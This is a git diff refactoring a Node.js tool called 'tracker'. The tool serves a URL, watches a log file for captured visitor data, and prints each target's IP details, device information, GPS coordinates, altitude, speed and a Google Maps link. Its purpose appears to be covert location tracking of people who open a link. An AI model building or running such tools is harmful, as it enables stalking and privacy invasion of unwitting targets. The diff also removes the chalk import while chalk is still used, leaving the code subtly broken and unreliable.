@@ -1,7 +1,5 @@
 import promptSync from "prompt-sync";
 import fs from "fs";
-import path from "path";
-import chalk from "chalk";
 import getIpInfo from "./getIpInfo.js";
 import { startServer } from "./server.js";
 
@@ -10,7 +8,7 @@ const info = {
   version: "1.0.0",
   instagram: "https://instagram.com/mneto_nx",
   github: "https://github.com/hell-ctrl",
-  repository : "https://github.com/hell-ctrl/tracker"
+  repository: "https://github.com/hell-ctrl/tracker",
 };
 
 const banner = `
@@ -31,26 +29,15 @@ ${chalk.cyan("[+]")}${chalk.green("Repository:")} ${info.repository}
 console.log(banner);
 
 const prompt = promptSync();
-const url = prompt(`${chalk.cyan("[/>]")}${chalk.green("enter your url: ")}`);
-
-const filePath = path.join(path.dirname(new URL(import.meta.url).pathname), 'logs', 'data.json');
-const folderPath = path.join(path.dirname(new URL(import.meta.url).pathname), 'logs');
-
-if (!fs.existsSync(folderPath)) {
-  fs.mkdirSync(folderPath);
-}
-
-if (!fs.existsSync(filePath)) {
-  fs.writeFileSync(filePath, "{}");
-}
-
+const url = prompt(`${chalk.cyan("[/>]")}${chalk.green("Enter your url: ")}`);
 
 try {
   startServer(url);
-  fs.watchFile(filePath, (curr, prev) => {
-    fs.readFile(filePath, "utf-8", (err, data) => {
-      const json = JSON.parse(data);
-      getIpInfo(json.ip).then(resp => console.log(`
+  fs.watchFile("logs/data.json", (curr, prev) => {
+    let json = JSON.parse(fs.readFileSync("logs/data.json", "utf-8"));
+
+    getIpInfo(json.ip).then((resp) => {
+      console.log(`
 ${chalk.cyan("_".repeat(40))}
 
 ${chalk.yellow("[!] Device Informations:")}
@@ -81,9 +68,9 @@ ${chalk.cyan("[+]")}${chalk.green("ALTITUDE :")} ${json.location.altitude} m
 ${chalk.cyan("[+]")}${chalk.green("SPEED    :")} ${json.location.speed} m/s
 
 ${chalk.cyan("[+]")}${chalk.green("MAPS     :")} https://www.google.com/maps/place/${json.location.latitude}+${json.location.longitude}
-      `))
+`);
     });
   });
-} catch(e) {
-  console.log(chalk.red("an error has occurred!", e))
-};
+} catch (e) {
+  console.log(chalk.red("an error has occurred!", e));
+}
